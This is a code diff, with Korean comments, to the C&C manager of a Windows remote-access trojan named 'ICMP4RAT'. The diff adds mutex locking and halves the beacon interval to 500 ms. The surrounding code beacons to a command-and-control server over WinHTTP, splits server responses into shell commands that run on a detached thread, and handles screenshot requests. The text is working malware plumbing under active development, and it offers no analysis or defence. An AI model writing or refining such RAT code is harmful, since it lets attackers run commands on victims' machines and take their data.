@@ -7,6 +7,7 @@
 #include <list>
 #include <sstream>
 #include <thread>
+#include <mutex>
 #include "cncManager.h"
 #include "commandManager.h"
 
@@ -26,6 +27,7 @@ cncManager::~cncManager() {
 
 /* C&C에 http request를 보내는 함수. send후 response parsing을 호출함. */
 void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
+    std::lock_guard<std::mutex> guard(this->m1);
     this->hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 
     if (this->hSession)
@@ -76,7 +78,7 @@ void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
                 printf("Error %u in WinHttpReadData.\n", GetLastError());
 
             else
-                this->responseParser((UCHAR *)pszOutBuffer, dwSize);
+                this->responseParser((UCHAR*)pszOutBuffer, dwSize);
 
             delete[] pszOutBuffer;
 
@@ -89,6 +91,8 @@ void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
     if (this->hRequest) WinHttpCloseHandle(this->hRequest);
     if (this->hConnect) WinHttpCloseHandle(this->hConnect);
     if (this->hSession) WinHttpCloseHandle(this->hSession);
+    
+
 }   
 /* C&C에 데이터 보내는 함수. sendHttpRequest를 Wrapping함. */
 void cncManager::sendData(UCHAR DDtype, ULONG64 dlen, LPVOID data) {
@@ -132,7 +136,7 @@ void cncManager::sendData(UCHAR DDtype, ULONG64 dlen, LPVOID data) {
             DDprotocol* dataFrame = new DDprotocol;
             dataFrame->type = DDtype;
             dataFrame->len = left_offset;
-            dataFrame->seq = 0;
+            dataFrame->seq = LAST_SEQUENCE;
 
             UCHAR* stream = new UCHAR[sizeof(DDprotocol) + left_offset];
             memset(stream, 0, sizeof(DDprotocol) + left_offset);
@@ -157,7 +161,7 @@ void cncManager::sendBeacon() {
 
 	while (TRUE) {
 		this->sendHttpRequest((LPVOID)beaconFrame, sizeof(DDprotocol));
-		Sleep(1000);
+		Sleep(500);
 	}
 }
 
@@ -201,7 +205,7 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
                     while (std::getline(spliter, tmp, ';')) {
                         this->shellCmd.push_back(tmp);
                     }
-
+                    //this->handleShellRequest()
                     std::thread shellHandler = std::thread(&cncManager::handleShellRequest, this);
                     shellHandler.detach();
 
@@ -210,7 +214,6 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
 
                 case ftpRequest:
                 {
-                 clock_t start, end;
                  commandManager cmd;
                  LPVOID ptr = NULL;
                     /* 스샷 요청 처리 */
@@ -260,6 +263,7 @@ void cncManager::printParsedResponse(DDprotocol* resData,std::string type) {
 }
 
 void cncManager::handleShellRequest() {
+    std::lock_guard<std::mutex> guard(this->m2);
     commandManager commander;
     std::string result;
         while (!this->shellCmd.empty()) {
